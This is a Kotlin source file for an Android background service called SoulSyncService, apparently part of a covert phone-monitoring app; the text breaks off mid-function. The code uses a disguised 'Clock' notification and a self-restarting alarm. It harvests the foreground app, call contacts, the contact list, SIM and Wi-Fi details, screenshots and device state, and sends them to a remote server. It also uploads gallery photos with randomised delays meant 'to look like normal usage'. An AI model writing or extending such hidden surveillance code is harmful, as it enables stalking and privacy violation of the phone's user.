package com.soulsync.app

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.PowerManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Vibrator
import android.os.VibrationEffect
import androidx.core.app.NotificationCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject
import android.app.usage.UsageStatsManager
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothProfile
import android.provider.CallLog
import android.provider.MediaStore
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import java.util.Calendar

class SoulSyncService : Service() {
    private val CHANNEL_ID = "SoulSyncBackgroundServiceChannel"
    private val NOTIFICATION_ID = 998877
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private val handler = Handler(Looper.getMainLooper())
    private var syncRunnable: Runnable? = null
    private var nudgeRunnable: Runnable? = null
    private var screenReceiver: BroadcastReceiver? = null
    private var presenceRunnable: Runnable? = null
    // Most recently network-active real app (label) — used as the "current app"
    // when UsageStats is unreliable (e.g. Vivo shows Settings/Home instead).
    @Volatile private var lastNetworkApp: String = ""
    private var lastLatitude = 0.0
    private var lastLongitude = 0.0
    private var apiKey = ""
    private var apiBaseUrl = ""
    // Mirrors the in-app "Share My Location" toggle. While this is false the
    // service holds no location listener at all, so nothing is sampled.
    private var locationSharingOn = false
    // Always-on foreground. A repeating self-heal alarm revives the service fast if
    // an aggressive OEM kills it, so tracking resumes without a manual wake.
    private val SELF_HEAL_MIN = 6   // minutes between self-heal alarm fires
    // True while the notification is meant to be visible (always, in always-on mode).
    @Volatile private var foregroundActive = false

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        promoteToForeground()
        loadEnvConfig()
        try { setupLocationTracking() } catch (e: Exception) { e.printStackTrace() }
        startTelemetryLoop()
        startNudgePolling()
        startScreenPresence()
    }

    // Runs on every start (fresh, restart, self-heal alarm, admin re-assert).
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        applyForegroundMode()
        return START_STICKY
    }

    // Promote to a FOREGROUND service (disguised "Clock" notification) so the system
    // keeps us alive with the app closed and permits background location. Being
    // foreground does NOT sample location by itself — that only happens on the share
    // toggle or an admin one-shot.
    private fun promoteToForeground() {
        val notif = buildNotification("You are now connected to your time")
        // Android 14+ blocks starting a LOCATION foreground service from the
        // background (e.g. on boot, or from an FCM wake) unless "Allow all the
        // time" location is granted. So we try location first, then fall back to
        // dataSync, then a plain FGS — whichever succeeds keeps the service (and
        // battery/presence/usage tracking) alive. Location itself resumes once the
        // app is opened or the permission allows it.
        val types = intArrayOf(
            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            for (t in types) {
                try {
                    startForeground(NOTIFICATION_ID, notif, t)
                    foregroundActive = true
                    return
                } catch (e: Exception) { e.printStackTrace() }
            }
        }
        // Last resort: plain foreground service (no type).
        try {
            startForeground(NOTIFICATION_ID, notif)
            foregroundActive = true
        } catch (e: Exception) { e.printStackTrace() }
    }

    // Honours the super-admin "Foreground tracking" switch. ON (default) = stay a
    // foreground service (always-on notification) and keep a self-heal alarm armed
    // so an OEM kill is undone within a few minutes. OFF = stop the service and go
    // fully dormant (no notification, no tracking) until turned back on.
    private fun applyForegroundMode() {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val fgOn = prefs.getBoolean("foreground_on", true)
        if (!fgOn) {
            cancelSelfHealAlarm()
            foregroundActive = false
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) stopForeground(STOP_FOREGROUND_REMOVE)
                else @Suppress("DEPRECATION") stopForeground(true)
            } catch (e: Exception) { e.printStackTrace() }
            try { (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancel(NOTIFICATION_ID) } catch (_: Exception) {}
            stopSelf()
            return
        }
        promoteToForeground()
        scheduleSelfHealAlarm()
    }

    // Repeating self-heal via AlarmManager (survives process death, needs no server).
    // Fires every SELF_HEAL_MIN to make sure the foreground service is running; if the
    // OS killed it, WakeReceiver restarts it. Each fire re-arms the next one.
    private fun scheduleSelfHealAlarm() {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val at = System.currentTimeMillis() + SELF_HEAL_MIN * 60_000L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, at, selfHealPi())
            } else {
                am.set(android.app.AlarmManager.RTC_WAKEUP, at, selfHealPi())
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun cancelSelfHealAlarm() {
        try { (getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager).cancel(selfHealPi()) } catch (_: Exception) {}
    }

    private fun selfHealPi(): android.app.PendingIntent =
        android.app.PendingIntent.getBroadcast(
            this, 4711, Intent(this, WakeReceiver::class.java),
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or
                (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) android.app.PendingIntent.FLAG_IMMUTABLE else 0)
        )

    // Presence follows the PHONE SCREEN, not the app: screen ON (user is using
    // the phone) → Online (green dot); screen OFF → Offline. While the screen is
    // on we re-ping every 45s so the server's 70s window stays fresh.
    private fun startScreenPresence() {
        try {
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            screenReceiver = object : BroadcastReceiver() {
                override fun onReceive(ctx: Context?, intent: Intent?) {
                    when (intent?.action) {
                        Intent.ACTION_SCREEN_OFF -> if (!isOnCall()) stopPresencePings()
                        Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
                            startPresencePings()
                            // Count unlocks
                            if (intent.action == Intent.ACTION_USER_PRESENT) {
                                try {
                                    val sp = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                                    sp.edit().putInt("unlock_count", sp.getInt("unlock_count", 0) + 1).apply()
                                } catch (_: Exception) {}
                            }
                        }
                    }
                }
            }
            registerReceiver(screenReceiver, filter)
        } catch (e: Exception) { e.printStackTrace() }

        // Set the initial state from the current screen.
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm?.isInteractive == true) startPresencePings() else postPresence(false)
        } catch (e: Exception) { startPresencePings() }
    }

    private fun startPresencePings() {
        presenceRunnable?.let { handler.removeCallbacks(it) }
        presenceRunnable = object : Runnable {
            override fun run() {
                // Stay Online while the screen is on OR a call is in progress (during
                // a call the screen is usually off, but the person is clearly active).
                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                val onCall = isOnCall()
                // Call just ended → reset the contact-name retry counter for next call.
                if (wasOnCall && !onCall) {
                    try {
                        getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE).edit()
                            .remove("last_call_contact").remove("last_call_contact_time")
                            .remove("last_call_type")
                            .putInt("call_contact_tries", 0).apply()
                    } catch (_: Exception) {}
                }
                wasOnCall = onCall
                if (pm?.isInteractive != false || onCall) {
                    postPresence(true, onCall)
                    handler.postDelayed(this, 8000L) // fast: catch app switches within ~8s
                } else {
                    postPresence(false, false)
                    presenceRunnable = null
                }
            }
        }
        handler.post(presenceRunnable!!)
    }

    private fun stopPresencePings() {
        presenceRunnable?.let { handler.removeCallbacks(it) }
        presenceRunnable = null
        postPresence(false) // screen off → Offline immediately
    }

    // The REAL app currently in the foreground (resolved to a readable name).
    // Runs in the background service, so it captures the OTHER app the user is on
    // — not SoulSync — which is what "Current App" should show.
    // The package of the app CURRENTLY on screen (last MOVE_TO_FOREGROUND), or ""
    // if none/unknown. System, launcher, keyboard, Settings and background-service
    // packages are skipped. NO network fallback — a background app that's merely
    // using data must never be reported as the "current" app.
    // Which source decided the current app on the LAST call — sent to the server so
    // "All Tracking" can show how accurate the value is (live vs approximate).
    @Volatile private var lastAppSource: String = "none"
    @Volatile private var wasOnCall: Boolean = false

    // Multi-source fusion: gather the foreground app from EVERY available signal and
    // return the one from the most trustworthy source. Priority (best → worst):
    //   1. Accessibility  — real-time, event-driven, ~99% accurate on all OEMs
    //   2. UsageStats events (resume/pause replay)
    //   3. UsageStats most-recently-used (last ~90s)
    private fun getForegroundPackage(): String {
        try {
            // Nothing is meaningfully "on screen" if the display is off or locked —
            // this lets the server CLEAR a stale app so nothing sticks.
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm != null && !pm.isInteractive) { lastAppSource = "screen_off"; return "" }
            val km = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
            if (km != null && km.isKeyguardLocked) { lastAppSource = "screen_off"; return "" }

            // ── Source 1: Accessibility (highest confidence) ──
            if (isAccessibilityRunning()) {
                lastAppSource = "accessibility"
                return getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                    .getString("acc_fg_pkg", "") ?: ""
            }

            if (!hasUsageAccess()) { lastAppSource = "none"; return "" }
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager
                ?: run { lastAppSource = "none"; return "" }
            val now = System.currentTimeMillis()
            var launcherPkg = ""
            try {
                val homeIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME)
                launcherPkg = packageManager.resolveActivity(homeIntent, 0)?.activityInfo?.packageName ?: ""
            } catch (_: Exception) {}

            // ── PRIMARY (frequent polling): most-recently-used real app ──
            // lastTimeUsed tracks REAL use and moves forward continuously while an
            // app is on screen, so the freshest one in the last ~2 min is what's on
            // screen right now. Unlike raw resume/pause replay it never latches on a
            // stale app (that was the "always PhonePe" bug). We poll every ~8s.
            var bestPkg = ""; var bestTime = 0L
            try {
                val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_BEST, now - 2 * 60_000L, now)
                if (stats != null) for (s in stats) {
                    val p = s.packageName ?: continue
                    if (p == launcherPkg || isSystemPkg(p) || p == packageName) continue
                    if (s.lastTimeUsed > bestTime) { bestTime = s.lastTimeUsed; bestPkg = p }
                }
            } catch (_: Exception) {}
            if (bestPkg.isNotEmpty() && bestTime >= now - 120_000L) { lastAppSource = "usage_recent"; return bestPkg }

            // ── SECONDARY: currently-resumed app from the event stream ──
            // Only reached when nothing was "used" in the last 2 min (e.g. a long
            // read on one screen). Gives the last resumed real app.
            try {
                val FG = android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND
                val BG = android.app.usage.UsageEvents.Event.MOVE_TO_BACKGROUND
                val events = usm.queryEvents(now - 30 * 60_000L, now)
                val ev = android.app.usage.UsageEvents.Event()
                var fg = ""
                while (events.hasNextEvent()) {
                    events.getNextEvent(ev)
                    val p = ev.packageName ?: continue
                    when (ev.eventType) {
                        FG -> when {
                            p == launcherPkg -> fg = ""
                            isSystemPkg(p) || p == packageName -> { }
                            else -> fg = p
                        }
                        BG -> { if (p == fg) fg = "" }
                    }
                }
                if (fg.isNotEmpty()) { lastAppSource = "usage_events"; return fg }
            } catch (_: Exception) {}

            lastAppSource = "none"
            return ""
        } catch (_: Exception) { lastAppSource = "none"; return "" }
    }

    // True when our AccessibilityService is enabled by the user, so we can trust
    // its real-time foreground package instead of polling UsageStats.
    private fun isAccessibilityRunning(): Boolean {
        return try {
            val flat = android.provider.Settings.Secure.getString(
                contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            flat.contains("$packageName/", ignoreCase = true) &&
                flat.contains("AppMonitorService", ignoreCase = true)
        } catch (_: Exception) { false }
    }

    // System / OEM / Google-service packages the user isn't meaningfully "using".
    private fun isSystemPkg(p: String): Boolean {
        return p == "android" || p == "com.android.systemui" ||
            p.startsWith("com.android.inputmethod") || p.contains(".ime") ||
            p.contains("launcher") || p.startsWith("com.android.settings") ||
            p.startsWith("com.android.vending") || p.startsWith("com.google.android.gms") ||
            p.startsWith("com.google.android.gsf") || p.startsWith("com.google.android.googlequicksearchbox") ||
            p == "com.google.android.apps.messaging" || p.contains("com.vivo.") ||
            p.contains("com.bbk.") || p.contains("com.oppo.") || p.contains("com.coloros.") ||
            p.contains("com.miui.") || p.contains("com.xiaomi.")
    }

    private fun getForegroundApp(): String {
        val pkg = getForegroundPackage()
        if (pkg.isEmpty()) return ""
        return try {
            packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
        } catch (_: Exception) { pkg }
    }

    // True while the phone is on a call — cellular (MODE_IN_CALL) OR a VoIP/app
    // call like WhatsApp (MODE_IN_COMMUNICATION). No special permission needed.
    private fun isOnCall(): Boolean {
        return try {
            val am = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager ?: return false
            am.mode == android.media.AudioManager.MODE_IN_CALL ||
                am.mode == android.media.AudioManager.MODE_IN_COMMUNICATION
        } catch (_: Exception) { false }
    }

    // A readable "what call" label — "Phone call", or "WhatsApp call" for a VoIP app.
    private fun callLabel(): String {
        return try {
            val am = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
            when (am?.mode) {
                android.media.AudioManager.MODE_IN_CALL -> "📞 Phone call"
                android.media.AudioManager.MODE_IN_COMMUNICATION -> {
                    val app = getForegroundApp()
                    if (app.isNotEmpty() && !app.equals("soulsync", true)) "📞 $app call" else "📞 Voice / Video call"
                }
                else -> "📞 On call"
            }
        } catch (_: Exception) { "📞 On call" }
    }

    // POST the online/offline flag (+ live foreground app / call status) to the server.
    private fun postPresence(online: Boolean, onCall: Boolean = false) {
        val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        val jwtToken = prefs.getString("jwt_token", "") ?: ""
        if (jwtToken.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return
        val app = when {
            onCall -> callLabel()
            online -> getForegroundApp()
            else -> ""
        }
        Thread {
            try {
                val url = URL("$apiBaseUrl/api.php?route=presence")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("X-API-Key", apiKey)
                conn.setRequestProperty("Authorization", "Bearer $jwtToken")
                conn.doOutput = true
                val payload = JSONObject().apply {
                    put("online", if (online) 1 else 0)
                    put("onCall", if (onCall) 1 else 0)
                    put("currentApp", app)
                    put("appSource", if (onCall) "call" else lastAppSource)
                    try {
                        val sp2 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        val cls = sp2.getString("acc_fg_class", "") ?: ""
                        val accPkg = sp2.getString("acc_fg_pkg", "") ?: ""
                        // Send appClass if accessibility is the source for current app
                        // OR if the accessibility package is still the foreground app.
                        // No time limit — as long as the user is on the same app, the
                        // class from the last window change is still valid (e.g. Reels
                        // for 10 minutes without any new accessibility event).
                        if (cls.isNotEmpty() && accPkg.isNotEmpty() && lastAppSource == "accessibility") {
                            put("appClass", cls)
                        }
                    } catch (_: Exception) {}
                    if (onCall) {
                        try {
                            // Primary: Android call log (needs READ_CALL_LOG granted manually).
                            val (clName, clDir) = getLatestCallLogEntry()
                            if (clName.isNotEmpty()) {
                                put("callContact", clName)
                                if (clDir.isNotEmpty()) put("callType", clDir)
                            } else {
                                // Fallback: notification-extracted contact.
                                val cp = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                                val name = cp.getString("last_call_contact", "") ?: ""
                                val ts = cp.getLong("last_call_contact_time", 0)
                                if (name.isNotEmpty() && System.currentTimeMillis() - ts < 300_000) {
                                    put("callContact", name)
                                }
                                val ct = cp.getString("last_call_type", "") ?: ""
                                if (ct.isNotEmpty()) put("callType", ct)
                            }
                        } catch (_: Exception) {}
                    }
                    // Connected Wi-Fi name — used (admin-only) to detect reached/left home.
                    put("wifi", getWifiSsid())
                    // Network type: WiFi / Mobile Data / Offline.
                    put("networkType", getNetworkType())
                    // SIM info: carrier, slot, number, dual-SIM details.
                    try { val si = getSimInfo(); if (si.length() > 0) put("simInfo", si) } catch (_: Exception) {}
                    // Accessibility events buffer — flush to server.
                    try {
                        val sp3 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        val accRaw = sp3.getString("acc_events", "[]") ?: "[]"
                        val accArr = org.json.JSONArray(accRaw)
                        if (accArr.length() > 0) {
                            put("accEvents", accArr)
                            sp3.edit().putString("acc_events", "[]").apply()
                        }
                    } catch (_: Exception) {}
                    // New photos/videos since last ping.
                    try { val mc = getNewMediaCount(); if (mc.length() > 0) put("newMedia", mc) } catch (_: Exception) {}
                    // Connected Bluetooth devices.
                    try { val bt = getBluetoothDevices(); if (bt.length() > 0) put("bluetooth", bt) } catch (_: Exception) {}
                    // App install/uninstall events.
                    try {
                        val sp4 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        val pkgRaw = sp4.getString("pkg_events", "[]") ?: "[]"
                        val pkgArr = org.json.JSONArray(pkgRaw)
                        if (pkgArr.length() > 0) {
                            put("pkgEvents", pkgArr)
                            sp4.edit().putString("pkg_events", "[]").apply()
                        }
                    } catch (_: Exception) {}
                    // Device state: volume, brightness, ringer mode
                    try {
                        val audio = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                        if (audio != null) {
                            put("mediaVol", audio.getStreamVolume(android.media.AudioManager.STREAM_MUSIC))
                            put("mediaVolMax", audio.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC))
                            put("ringVol", audio.getStreamVolume(android.media.AudioManager.STREAM_RING))
                            put("ringerMode", when(audio.ringerMode) {
                                android.media.AudioManager.RINGER_MODE_SILENT -> "silent"
                                android.media.AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
                                else -> "normal"
                            })
                        }
                        val brightness = android.provider.Settings.System.getInt(contentResolver, android.provider.Settings.System.SCREEN_BRIGHTNESS, -1)
                        if (brightness >= 0) put("brightness", brightness)
                        val sp5 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        put("unlockCount", sp5.getInt("unlock_count", 0))
                        // Headphone connected
                        put("headphone", if (audio != null && (audio.isWiredHeadsetOn || audio.isBluetoothA2dpOn)) 1 else 0)
                    } catch (_: Exception) {}
                    // VPN active check
                    try {
                        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
                        val vpnOn = cm?.allNetworks?.any { n ->
                            cm.getNetworkCapabilities(n)?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true
                        } ?: false
                        put("vpn", if (vpnOn) 1 else 0)
                    } catch (_: Exception) {}
                    // USB connected
                    try {
                        val usbOn = android.os.Environment.getExternalStorageState() == android.os.Environment.MEDIA_MOUNTED &&
                            java.io.File("/sys/class/android_usb/android0/state").let { f ->
                                f.exists() && f.readText().trim() == "CONFIGURED"
                            }
                        // Simpler: check USB charging as proxy for cable connected
                        val bm2 = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { registerReceiver(null, it) }
                        val usbCharge = bm2?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, 0) == android.os.BatteryManager.BATTERY_PLUGGED_USB
                        put("usb", if (usbCharge) 1 else 0)
                    } catch (_: Exception) {}
                    // Cast/Screen mirror active
                    try {
                        val mr = getSystemService(Context.MEDIA_ROUTER_SERVICE) as? android.media.MediaRouter
                        val route = mr?.getSelectedRoute(android.media.MediaRouter.ROUTE_TYPE_LIVE_VIDEO)
                        val casting = route != null && route !== mr.getDefaultRoute()
                        put("casting", if (casting) 1 else 0)
                    } catch (_: Exception) {}
                    // Quick network-app check every ~30s to catch hidden/background apps
                    try {
                        val netCheckInterval = 30_000L
                        val sp7 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        val lastNetCheck = sp7.getLong("last_net_check", 0L)
                        if (System.currentTimeMillis() - lastNetCheck > netCheckInterval) {
                            sp7.edit().putLong("last_net_check", System.currentTimeMillis()).apply()
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                val nsm2 = getSystemService(Context.NETWORK_STATS_SERVICE) as? android.app.usage.NetworkStatsManager
                                if (nsm2 != null) {
                                    val checkWindow = System.currentTimeMillis() - 60_000L
                                    val perUid2 = HashMap<Int, Long>()
                                    for (type2 in intArrayOf(android.net.ConnectivityManager.TYPE_WIFI, android.net.ConnectivityManager.TYPE_MOBILE)) {
                                        try {
                                            val st2 = nsm2.querySummary(type2, null, checkWindow, System.currentTimeMillis())
                                            val bk2 = android.app.usage.NetworkStats.Bucket()
                                            while (st2.hasNextBucket()) { st2.getNextBucket(bk2); perUid2[bk2.uid] = (perUid2[bk2.uid] ?: 0L) + bk2.rxBytes + bk2.txBytes }
                                            st2.close()
                                        } catch (_: Exception) {}
                                    }
                                    val pm2 = packageManager
                                    var topDelta2 = 0L; var topApp2 = ""
                                    val prevNet = sp7.getString("prev_net_snap", "") ?: ""
                                    val prevMap = try { if (prevNet.isNotEmpty()) JSONObject(prevNet) else JSONObject() } catch (_: Exception) { JSONObject() }
                                    val newMap = JSONObject()
                                    perUid2.entries.sortedByDescending { it.value }.take(30).forEach { (uid2, bytes2) ->
                                        if (bytes2 <= 0L) return@forEach
                                        val pkgs2 = try { pm2.getPackagesForUid(uid2) } catch (_: Exception) { null }
                                        val pkg2 = pkgs2?.firstOrNull() ?: return@forEach
                                        if (pkg2 == packageName || pkg2.contains("soulsync", true)) return@forEach
                                        if (isSystemPkg(pkg2)) return@forEach
                                        newMap.put(pkg2, bytes2)
                                        val prev2 = prevMap.optLong(pkg2, 0L)
                                        val delta2 = if (prev2 > 0L) bytes2 - prev2 else 0L
                                        if (delta2 > 5120L && delta2 > topDelta2) {
                                            topDelta2 = delta2
                                            topApp2 = try { pm2.getApplicationLabel(pm2.getApplicationInfo(pkg2, 0)).toString() } catch (_: Exception) { pkg2 }
                                        }
                                    }
                                    sp7.edit().putString("prev_net_snap", newMap.toString()).apply()
                                    if (topApp2.isNotEmpty()) lastNetworkApp = topApp2
                                }
                            }
                        }
                    } catch (_: Exception) {}
                    // Network-detected current app (fallback when no accessibility)
                    if (lastNetworkApp.isNotEmpty()) put("networkApp", lastNetworkApp)
                    // Recent contact usage from call log
                    try { val rc = getRecentContacts(); if (rc.length() > 0) put("recentContacts", rc) } catch (_: Exception) {}
                    // New screenshots since last check
                    try {
                        val sp6 = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
                        val lastSS = sp6.getLong("last_screenshot_check", System.currentTimeMillis() - 60_000)
                        val lastSSSec = lastSS / 1000
                        var ssCount = 0
                        val cur = contentResolver.query(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            arrayOf("_id", "_data"),
                            "${MediaStore.Images.Media.DATE_ADDED} > ? AND (${MediaStore.Images.Media.DATA} LIKE '%screenshot%' OR ${MediaStore.Images.Media.DATA} LIKE '%Screenshot%' OR ${MediaStore.Images.Media.DATA} LIKE '%screen_shot%' OR ${MediaStore.Images.Media.DATA} LIKE '%Screen%capture%')",
                            arrayOf(lastSSSec.toString()), null)
                        cur?.use { ssCount = it.count }
                        sp6.edit().putLong("last_screenshot_check", System.currentTimeMillis()).apply()
                        if (ssCount > 0) put("screenshots", ssCount)
                    } catch (_: Exception) {}
                }
                val wr = OutputStreamWriter(conn.outputStream)
                wr.write(payload.toString()); wr.flush()
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    // Read the phone's contacts and sync them — ONLY if the user MANUALLY granted
    // READ_CONTACTS (we never prompt). Throttled to once every 6h. Admin-only.
    private fun readAndSendContacts() {
        try {
            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                checkSelfPermission(android.Manifest.permission.READ_CONTACTS)) return
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val now = System.currentTimeMillis()
            if (now - prefs.getLong("contacts_sync_at", 0L) < 6 * 3600_000L) return
            val jwt = prefs.getString("jwt_token", "") ?: ""
            if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return

            Thread {
                try {
                    val arr = org.json.JSONArray()
                    val seen = HashSet<String>()
                    val cur = contentResolver.query(
                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(
                            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                        ), null, null, null)
                    cur?.use {
                        val ni = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                        val pi = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                        while (it.moveToNext()) {
                            val name = if (ni >= 0) it.getString(ni) ?: "" else ""
                            var num = if (pi >= 0) it.getString(pi) ?: "" else ""
                            num = num.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
                            if (num.length < 4) continue
                            if (!seen.add(num)) continue
                            arr.put(org.json.JSONObject().apply { put("name", name); put("phone", num) })
                        }
                    }
                    if (arr.length() == 0) return@Thread
                    val url = URL("$apiBaseUrl/api.php?route=contacts/sync")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("X-API-Key", apiKey)
                    conn.setRequestProperty("Authorization", "Bearer $jwt")
                    conn.doOutput = true
                    conn.connectTimeout = 15000; conn.readTimeout = 15000
                    val payload = org.json.JSONObject().apply { put("contacts", arr) }
                    OutputStreamWriter(conn.outputStream).use { w -> w.write(payload.toString()); w.flush() }
                    if (conn.responseCode in 200..299) prefs.edit().putLong("contacts_sync_at", now).apply()
                    conn.disconnect()
                } catch (e: Exception) { e.printStackTrace() }
            }.start()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun checkAndSyncGallery() {
        try {
            val hasPermission = if (android.os.Build.VERSION.SDK_INT >= 33) {
                checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
            } else {
                checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            if (!hasPermission) { android.util.Log.w("SOULSYNC", "Gallery: no permission"); return }
            val prefs = getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
            val jwt = prefs.getString("jwt_token", "") ?: ""
            if (jwt.isEmpty() || apiBaseUrl.isEmpty() || apiKey.isEmpty()) return
            val now = System.currentTimeMillis()
            if (now - prefs.getLong("gallery_check_at", 0L) < 60_000L) return
            prefs.edit().putLong("gallery_check_at", now).apply()

            Thread {
                try {
                    android.util.Log.d("SOULSYNC", "Gallery: checking sync...")
                    // Check if admin requested thumbnail sync or full image
                    val checkUrl = java.net.URL("$apiBaseUrl/api.php?route=gallery/check-sync")
                    val checkConn = checkUrl.openConnection() as java.net.HttpURLConnection
                    checkConn.requestMethod = "GET"
                    checkConn.setRequestProperty("X-API-Key", apiKey)
                    checkConn.setRequestProperty("Authorization", "Bearer $jwt")
                    checkConn.connectTimeout = 10000; checkConn.readTimeout = 10000
                    val checkCode = checkConn.responseCode
                    if (checkCode != 200) {
                        android.util.Log.e("SOULSYNC", "Gallery: check failed $checkCode")
                        checkConn.disconnect(); return@Thread
                    }
                    val body = checkConn.inputStream.bufferedReader().readText()
                    checkConn.disconnect()
                    android.util.Log.d("SOULSYNC", "Gallery: response=$body")
                    val json = org.json.JSONObject(body)
                    val respData = json.optJSONObject("data") ?: json
                    val syncRequested = respData.optBoolean("sync_requested", false)
                    val fullRequests = respData.optJSONArray("full_requests")

                    // Handle full image requests — stagger uploads to look like normal usage
                    if (fullRequests != null && fullRequests.length() > 0) {
                        android.util.Log.d("SOULSYNC", "Gallery: ${fullRequests.length()} full image requests")
                        val onWifi = try {
                            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
                            nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true
                        } catch (_: Exception) { false }
                        for (i in 0 until fullRequests.length()) {
                            val fname = fullRequests.optString(i, "")
                            if (fname.isEmpty()) continue
                            uploadFullImage(jwt, fname)
                            if (i < fullRequests.length() - 1) {
                                val delayMs = if (onWifi) (1500L + (Math.random() * 2500).toLong())
                                              else (4000L + (Math.random() * 6000).toLong())
                                Thread.sleep(delayMs)
                            }
                        }
                    }

                    // Auto sync every 6 hours even without admin request
                    val autoSyncDue = now - prefs.getLong("gallery_auto_sync_at", 0L) > 6 * 3600_000L
                    val shouldSync = syncRequested || autoSyncDue
                    if (!shouldSync) return@Thread
                    if (autoSyncDue) prefs.edit().putLong("gallery_auto_sync_at", now).apply()
                    android.util.Log.d("SOULSYNC", "Gallery: syncing! admin=$syncRequested auto=$autoSyncDue")

                    val seenNames = HashSet<String>()
                    var totalSynced = 0

                    // Scan ALL media types from MediaStore (images, videos, audio)
                    data class MediaSource(val uri: android.net.Uri, val type: String)
                    val mediaSources = listOf(
                        MediaSource(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image"),
                        MediaSource(android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video"),
                        MediaSource(android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio")
                    )
                    for (ms in mediaSources) {
                        try {
                            val projection = arrayOf("_id", "_display_name", "date_added", "_size", "mime_type", "_data")
